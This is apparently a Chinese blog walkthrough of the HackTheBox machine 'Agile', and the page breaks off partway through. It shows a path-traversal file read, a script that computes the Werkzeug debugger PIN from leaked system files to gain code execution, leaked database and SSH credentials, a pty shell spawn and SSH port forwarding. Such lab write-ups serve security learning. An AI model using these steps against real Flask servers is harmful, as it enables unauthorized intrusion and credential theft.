<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Agile(HTB) · zIxyd's Blog</title><meta name="description" content="信息搜集12345678910111213141516171819202122232425262728┌──(kali㉿kali)-[~]└─$ sudo nmap -p- -min-rate 10000 10.10.11.203Starting Nmap 7.94 ( https://nmap.o"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toclist-text">文件读取</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flask%E7%AE%97pin%E7%A0%81"><span class="toclist-text">flask算pin码</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-corum"><span class="toclist-text">user-corum</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Chrome%E8%B0%83%E8%AF%95"><span class="toclist-text">Chrome调试</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-edwards"><span class="toclist-text">user-edwards</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toclist-text">文件读取</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flask%E7%AE%97pin%E7%A0%81"><span class="toclist-text">flask算pin码</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-corum"><span class="toclist-text">user-corum</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Chrome%E8%B0%83%E8%AF%95"><span class="toclist-text">Chrome调试</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-edwards"><span class="toclist-text">user-edwards</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Agile(HTB)</a></h3></div><div class="post-content"><p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- -min-rate 10000 10.10.11.203</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:50 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> superpass.htb (10.10.11.203)</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.87 seconds</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sT -sV -sC -O -p80 10.10.11.203</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:52 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> superpass.htb (10.10.11.203)</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: SuperPassword \xF0\x9F\xA6\xB8</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对目录，和子域名搜集无果后，直接访问80;</p>
<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>随意注册一个账号，并登录；在<code>/vault</code>下有一个记录用户名和密码的功能，并且可以导出，</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125105600.png"></p>
<p>“导出”的http-header的get请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /download?fn=12345_export_9b398f27c8.csv HTTP/1.1</span><br><span class="line">Host: superpass.htb</span><br></pre></td></tr></table></figure>

<p>这里并不难发现，”导出”功能点存在，目录穿越导致任意文件下载；并且可以看到<code>corum</code>,<code>edwards</code>,<code>dev_admin</code>用户位于”&#x2F;home&#x2F;“下；</p>
<p>即使这里存在文件读取，但是不知道敏感信息到路径等，无法得到立足点；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125110820.png"></p>
<h2 id="flask算pin码"><a href="#flask算pin码" class="headerlink" title="flask算pin码"></a>flask算pin码</h2><p>在注册用户时，有一个flask的报错；得知，这是一个flask应用；当我尝试通过文件读取拿到flask默认app应用的源码是<code>/app/app.py</code>时，并没有这个文件，看来路径没我想到那么简单；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125111704.png"></p>
<p>我试着看看flask的动态调试是否开启,访问<code>/console</code>路径，返回的是：”404 Not Found”;我以前都是这样查看flask的动态调试是否为开启状态的；我自以为访问<code>/console</code>没有回显就是动态调试为关闭；实时证明我是多么愚蠢；</p>
<p>在报错页面，点击右侧的小窗口即，就会弹出要求输入pin的框</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125112201.png"></p>
<p>打ctf打多了的，一下就想到了”文件读取”+”pin码”；很明显需要我们通过文件读取从而计算pin码；</p>
<p>在<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#probably_public_bits">hacktricks</a>上有一篇关于计算pin码的文章，值得一看；</p>
<p>flask的pin码计算，根据环境和版本的不同，计算的方式不同。怎么确定用那种方式呢？在这台靶机中我们可以利用文件读取来查看这台机器计算pin码的源码</p>
<p><code>/app/venv/lib/python3.10</code>是根据报错页面得到的，<code>site-packages/werkzeug/debug/__init__.py</code>则是固定路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125113438.png"></p>
<p>源码太长,只贴一部分，从中可以看出是以<code>sha1</code>的方式计算的，我们对应的脚本也应该用sha1;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    username,</span><br><span class="line">    modname,</span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br></pre></td></tr></table></figure>

<p><code>username</code> 是启动此FLASK的用户；有一个比较聪明的办法，通过环境变量<code>/proc/self/environ</code>，</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125114544.png"></p>
<p>如果环境变量中没有，那就估计只能泄露<code>/etc/passwd</code>一个一个试了</p>
<p><code>modname</code> is flask.app</p>
<p><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>这里的第三个值默认的<code>Flask</code>，但情况并非总是如此;而是’wsgi_app’;这与 Flask 在主机上的启动方式有关。</p>
<p>这一点可以通过<code>/proc/self/cmdline</code>；cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125115109.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/venv/bin/python3 /app/venv/bin/gunicorn --<span class="built_in">bind</span> 127.0.0.1:5000 --threads=10 --<span class="built_in">timeout</span> 600 wsgi:app</span><br></pre></td></tr></table></figure>

<p>这个命令的意思是使用Python虚拟环境中的Python 3解释器来运行Gunicorn服务器，绑定到本地的5000端口，使用10个线程处理请求，并设置请求超时时间为600秒，同时运行名为app的WSGI应用程序;</p>
<p><code>getattr(mod, &#39;__file__&#39;, None)</code> 是Flask目录中<code>app.py</code>的绝对路径，通过报错页面得知；</p>
<p><code>uuid.getnode()</code>是<strong>当前计算机的MAC地址</strong>，<code>str(uuid.getnode())</code>是mac地址的十进制表达。</p>
<p>要<strong>查找服务器 MAC 地址</strong>，需要知道<strong>正在使用哪个网络接口</strong>来为应用程序提供服务（例如<code>eth0</code>）。如果未知，则<strong>泄漏</strong><code>/proc/net/arp</code>设备 ID，然后<strong>泄漏</strong>MAC 地址<code>/sys/class/net/&lt;device id&gt;/address</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125115642.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125120000.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(<span class="string">&quot;00:50:56:b9:1e:a9&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),16) </span><br><span class="line">345052356265</span><br></pre></td></tr></table></figure>

<p><code>get_machine_id()</code>在源码中是一个函数，主要的功能是放回”&#x2F;etc&#x2F;machine-id”或者”&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id”之中一个(machine-id更优先)，和”&#x2F;proc&#x2F;self&#x2F;cgroup”的值以<code>/</code>分割的第一个放回值，这一点可能表达的不是很清楚，自己看看源码就懂了；</p>
<p>贴了<code>get_machine_id()</code>函数中的一部分代码；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            value = f.readline().strip()</span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> value:</span><br><span class="line">        linux += value</span><br><span class="line">        <span class="keyword">break</span><span class="comment">#这里有一个break,如果可以拿到&quot;/etc/machine-id&quot;就会退出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> OSError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> linux:</span><br><span class="line">    <span class="keyword">return</span> linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125121337.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125121257.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;www-data&#x27;</span>  </span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;wsgi_app&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;/app/venv/lib/python3.10/site-packages/flask/app.py&#x27;</span>  </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;345052356265&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="string">&#x27;ed5b159560f54721827644bc9b220d00superpass.service&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125205515.png"></p>
<h2 id="user-corum"><a href="#user-corum" class="headerlink" title="user-corum"></a>user-corum</h2><p>发现敏感文件，其实在&#x2F;app目录下也只有config_prod.json文件对www-data可读</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat config_prod.json                                                                               </span><br><span class="line">&#123;&quot;SQL_URI&quot;: &quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>伪终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot; </span><br></pre></td></tr></table></figure>

<p>连接数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -usuperpassuser -p </span><br><span class="line">password: dSA6l7q*yIVs$39Ml6ywvgK</span><br></pre></td></tr></table></figure>

<p>从<code>superpass.passwords</code>表中发现corum用户的密码：5db7caa1d13cc37c9fc2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh corum@10.10.11.203</span><br><span class="line">password:5db7caa1d13cc37c9fc2</span><br></pre></td></tr></table></figure>

<p>权限检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ sudo -l</span><br><span class="line">[sudo] password for corum: </span><br><span class="line">Sorry, user corum may not run sudo on agile.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Chrome调试"><a href="#Chrome调试" class="headerlink" title="Chrome调试"></a>Chrome调试</h2><p>从<code>/etc/hosts</code>发现子域名”test.superpass.htb”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost superpass.htb test.superpass.htb</span><br><span class="line">127.0.1.1 agile</span><br></pre></td></tr></table></figure>

<p>查看子域名的nginx配置文件；它仅在本地主机上侦听，并将所有内容代理到本地主机 5555。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/etc/nginx/sites-available$ cat /etc/nginx/sites-available/superpass-test.nginx </span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:80<span class="comment">;</span></span><br><span class="line">    server_name test.superpass.htb<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/app-testing/superpass/static<span class="comment">;</span></span><br><span class="line">        expires 365d<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params<span class="comment">;</span></span><br><span class="line">        proxy_pass http://127.0.0.1:5555<span class="comment">;</span></span><br><span class="line">        proxy_set_header Host $host<span class="comment">;</span></span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr<span class="comment">;</span></span><br><span class="line">        proxy_set_header X-Forwarded-Protocol $scheme<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过ssh本地端口转发到kali机上；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 5555:localhost:5555 corum@superpass.htb</span><br></pre></td></tr></table></figure>

<p>而然，这并没有帮助；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125211630.png"></p>
<p>在<code>/tests/functional/test_site_interactively.py</code>文件发现在动态调试<code>selenium</code>；之前python爬虫用过<code>selenium</code>;</p>
<p><em>Selenium是</em>一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/app/app-testing$ cat ./tests/functional/test_site_interactively.py                                     </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/app-testing/tests/functional/creds.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    username, password = f.read().strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&quot;session&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">driver</span>():</span><br><span class="line">    options = Options()</span><br><span class="line">    <span class="comment">#options.add_argument(&quot;--no-sandbox&quot;)</span></span><br><span class="line">    options.add_argument(<span class="string">&quot;--window-size=1420,1080&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--remote-debugging-port=41829&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--crash-dumps-dir=/tmp&#x27;</span>)</span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span 